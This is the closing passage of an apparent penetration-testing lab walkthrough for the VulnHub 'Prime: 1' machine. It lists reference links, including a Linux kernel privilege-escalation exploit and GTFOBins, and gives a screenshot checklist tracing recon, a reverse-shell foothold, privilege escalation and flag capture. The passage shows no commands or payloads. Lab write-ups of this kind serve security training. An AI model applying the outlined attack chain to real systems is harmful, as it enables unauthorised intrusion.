- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/prime-1,358/>
- Community writeups consulted:
  - [Prime: 1 — Walkthrough for OSCP Series (anonhack.in)](https://anonhack.in/prime-1-walkthrough-for-oscp-series/)
  - [Prime: 1 | LifesFun's 101](https://lifesfun101.github.io/2019/09/15/Prime_1-walkthrough/)
  - [VulnHUB Prime-1 Walkthrough — NetwerkLABS](https://www.netwerklabs.eu/vulnhub-prime-1-walkthrough/)
  - [Prime 1 writeup — yufongg (GitHub)](https://github.com/yufongg/writeups/blob/main/Vulnhub/Linux/Prime%201/Prime%201.md)
- Vendor advisories / docs:
  - [Exploit-DB 45010 — Linux kernel < 4.13.9 local privilege escalation (CVE-2017-16995)](https://www.exploit-db.com/exploits/45010)
  - [GTFOBins](https://gtfobins.github.io/) — abusing sudo/SUID binaries
  - [WPScan](https://wpscan.com/) — WordPress enumeration
  - [OWASP: Path Traversal / Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-enum.png` — the key enumeration finding (`secret.txt` / hidden parameter)
- [ ] `images/04-foothold.png` — the initial exploit (reverse shell catch)
- [ ] `images/05-shell.png` — the interactive shell
- [ ] `images/06-user-flag.png` — user flag
- [ ] `images/07-privesc.png` — the privesc finding / root user
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
